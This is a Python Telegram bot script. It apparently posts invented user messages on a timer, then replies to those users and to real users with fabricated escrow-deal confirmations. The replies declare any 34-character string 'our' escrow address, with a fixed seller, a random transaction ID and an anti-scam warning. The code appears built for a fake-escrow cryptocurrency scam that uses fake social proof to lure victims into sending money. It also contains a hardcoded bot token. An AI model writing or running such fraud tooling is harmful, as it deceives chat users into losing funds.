import asyncio
import random
import string
import logging
from telegram import Bot
from telegram.ext import Application, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Enable logging
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------- Configuration ----------
BOT_TOKEN = "8388397874:AAFwbQDT07EQcb_r6_ekJfmcrtpz7Q6eSrE"
TARGET_CHAT_ID = -3891918957
# -----------------------------------

# Predefined artificial users (only usernames and display names now – no pictures)
ARTIFICIAL_USERS = [
    {"username": "alice_smith", "name": "Alice Smith"},
    {"username": "bob_jones",   "name": "Bob Jones"},
    {"username": "charlie_b",    "name": "Charlie B"},
    # Add more as needed
]

# Fixed seller details
SELLER_USERNAME = "ramos_milkovich"
SELLER_NUMBER = "5721124056"

def random_string(length, chars=string.ascii_letters + string.digits):
    return ''.join(random.choices(chars, k=length))

def random_transaction_id():
    part = lambda: random_string(5, string.ascii_uppercase + string.digits)
    return f"{part()}-{part()}-{part()}"

async def simulate_artificial_user(context: ContextTypes.DEFAULT_TYPE):
    """Every 5 minutes: pick a user, send a fake "user message", then reply with deal template."""
    bot = context.bot
    user = random.choice(ARTIFICIAL_USERS)

    # 1. Generate the random 34-character string
    random_str = random_string(34)

    # 2. Send a text message pretending to be the artificial user
    user_message = f"{user['name']} (@{user['username']}) sent:\n`{random_str}`"
    sent_msg = await bot.send_message(
        chat_id=TARGET_CHAT_ID,
        text=user_message,
    )

    # 3. Build the response template
    random_10_digit = random_string(10, string.digits)
    transaction_id = random_transaction_id()

    response = (
        f"ℹ️ The address you sent:\n`{random_str}`\n\n"
        f"📍The address is ours and the deal associated with it is:\n\n"
        f"⚡️ BUYER\n@{user['username']}\n[{random_10_digit}]\n\n"
        f"⚡️ SELLER\n@{SELLER_USERNAME}\n[{SELLER_NUMBER}]\n\n"
        f"📝 TRANSACTION ID\n{transaction_id}\n\n"
        f"🟢 ESCROW ADDRESS:\n`{random_str}`\n\n"
        f"⚠️ Make sure you also read about the other security features we have in place to avoid scams:\n"
        f"Click this to learn how to detect fake admins and click this to learn how to verify escrow addresses and more."
    )

    # 4. Send the response as a reply to the user message
    await bot.send_message(
        chat_id=TARGET_CHAT_ID,
        text=response,
        reply_to_message_id=sent_msg.message_id,
        parse_mode=ParseMode.MARKDOWN
    )

    logger.info(f"Simulated user @{user['username']} with string {random_str}")

async def handle_incoming_message(update, context):
    """Respond to real users who send a 34-character string."""
    if update.effective_user and update.effective_user.id == context.bot.id:
        return

    text = update.effective_message.text
    if not text:
        return

    if len(text) == 34 and all(c in string.ascii_letters + string.digits for c in text):
        user = update.effective_user
        username = user.username or user.first_name

        random_10_digit = random_string(10, string.digits)
        transaction_id = random_transaction_id()

        response = (
            f"ℹ️ The address you sent:\n`{text}`\n\n"
            f"📍The address is ours and the deal associated with it is:\n\n"
            f"⚡️ BUYER\n@{username}\n[{random_10_digit}]\n\n"
            f"⚡️ SELLER\n@{SELLER_USERNAME}\n[{SELLER_NUMBER}]\n\n"
            f"📝 TRANSACTION ID\n{transaction_id}\n\n"
            f"🟢 ESCROW ADDRESS:\n`{text}`\n\n"
            f"⚠️ Make sure you also read about the other security features we have in place to avoid scams:\n"
            f"Click this to learn how to detect fake admins and click this to learn how to verify escrow addresses and more."
        )
        await update.message.reply_text(response, parse_mode=ParseMode.MARKDOWN)

async def post_init(application: Application):
    """Schedule the artificial user job."""
    job_queue = application.job_queue
    if job_queue:
        job_queue.run_repeating(simulate_artificial_user, interval=300, first=10)
        logger.info("Scheduled artificial user job every 5 minutes.")

def main():
    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_incoming_message))
    application.run_polling()

if __name__ == "__main__":
    main()
